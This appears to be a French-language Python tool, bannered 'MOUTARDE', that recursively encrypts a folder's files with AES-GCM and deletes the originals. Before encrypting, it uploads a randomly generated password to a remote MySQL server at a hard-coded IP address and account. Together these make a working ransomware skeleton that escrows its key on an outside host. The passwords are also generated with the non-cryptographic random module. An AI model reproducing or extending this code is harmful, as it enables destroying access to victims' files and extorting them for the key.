import os
import string
import random
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend
import mysql.connector
import getpass


from art import *

moutarde = text2art("MOUTARDE")
print(moutarde)

CHUNK_SIZE = 64 * 1024  # 64 Ko

def generer_mot_aleatoire():
    return ''.join(random.choices(string.ascii_lowercase, k=8))


def generer_mot_de_passe(longueur=12):
    caracteres = string.ascii_letters + string.digits
    return ''.join(random.choices(caracteres, k=longueur))


def enregistrer_mot_de_passe(username, mot_de_passe):
    try:
        db_password = getpass.getpass("Entrez le mot de passe MySQL : ")
        connexion = mysql.connector.connect(
            host="82.197.82.30",
            user="u189666068_helios",
            password=db_password,
            database="u189666068_passe"
        )
        curseur = connexion.cursor()
        curseur.execute(
            "INSERT INTO utilisateurs (username, mot_de_passe) VALUES (%s, %s)",
            (username, mot_de_passe)
        )
        connexion.commit()
        print("Mot de passe sécurisé enregistré.")
    except Exception as err:
        print("Erreur MySQL:", err)
    finally:
        if 'curseur' in locals():
            curseur.close()
        if 'connexion' in locals():
            connexion.close()


def derive_key(password: bytes, salt: bytes) -> bytes:
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100_000,
        backend=default_backend()
    )
    return kdf.derive(password)


def encrypt_file(input_path, output_path, password):
    salt = os.urandom(16)
    nonce = os.urandom(12)
    key = derive_key(password.encode(), salt)
    encryptor = Cipher(
        algorithms.AES(key),
        modes.GCM(nonce),
        backend=default_backend()
    ).encryptor()

    with open(input_path, 'rb') as f_in, open(output_path, 'wb') as f_out:
        f_out.write(salt)
        f_out.write(nonce)
        while chunk := f_in.read(CHUNK_SIZE):
            f_out.write(encryptor.update(chunk))
        f_out.write(encryptor.finalize())
        f_out.write(encryptor.tag)


def encrypt_folder(folder_path, password, keep_original=False):
    for root, _, files in os.walk(folder_path):
        for file_name in files:
            file_path = os.path.join(root, file_name)
            if file_path.endswith(".enc"):
                continue
            encrypted_path = file_path + ".enc"
            print(f"Chiffrement de : {file_path}")
            encrypt_file(file_path, encrypted_path, password)
            if not keep_original:
                os.remove(file_path)


def decrypt_file(input_path, output_path, password):
    with open(input_path, 'rb') as f_in:
        salt = f_in.read(16)
        nonce = f_in.read(12)
        file_size = os.path.getsize(input_path)

        f_in.seek(file_size - 16)
        tag = f_in.read(16)

        key = derive_key(password.encode(), salt)

        decryptor = Cipher(
            algorithms.AES(key),
            modes.GCM(nonce, tag),
            backend=default_backend()
        ).decryptor()

        f_in.seek(28)
        to_read = file_size - 28 - 16
        with open(output_path, 'wb') as f_out:
            total = 0
            while total < to_read:
                chunk = f_in.read(min(CHUNK_SIZE, to_read - total))
                f_out.write(decryptor.update(chunk))
                total += len(chunk)
            f_out.write(decryptor.finalize())


def decrypt_folder(folder_path, password, keep_encrypted=False):
    for root, _, files in os.walk(folder_path):
        for file_name in files:
            if not file_name.endswith(".enc"):
                continue
            file_path = os.path.join(root, file_name)
            decrypted_path = os.path.join(root, file_name[:-4])
            print(f"Déchiffrement de : {file_path}")
            decrypt_file(file_path, decrypted_path, password)
            if not keep_encrypted:
                os.remove(file_path)


def main():
    choix = input("pour crypter (0) : pour decrypter (1) : ")

    if choix == "0":
        nom = generer_mot_aleatoire()
        mdp = generer_mot_de_passe()
        enregistrer_mot_de_passe(nom, mdp)
        print(f"{mdp} est le mot de passe utilisé pour le chiffrement.")
        dossier = input("Entre l'adresse complète du dossier à crypter : ")
        if not os.path.isdir(dossier):
            print("Dossier invalide.")
            return
        encrypt_folder(dossier, mdp)
        print("Chiffrement terminé.")

    elif choix == "1":
        dossier = input("Entre l'adresse complète du dossier à décrypter : ")
        if not os.path.isdir(dossier):
            print("Dossier invalide.")
            return
        motdepasse = input("Entrez le mot de passe de déchiffrement : ")
        decrypt_folder(dossier, motdepasse)
        print("Déchiffrement terminé.")
    else:
        print("Choix invalide.")


if __name__ == "__main__":
    main()

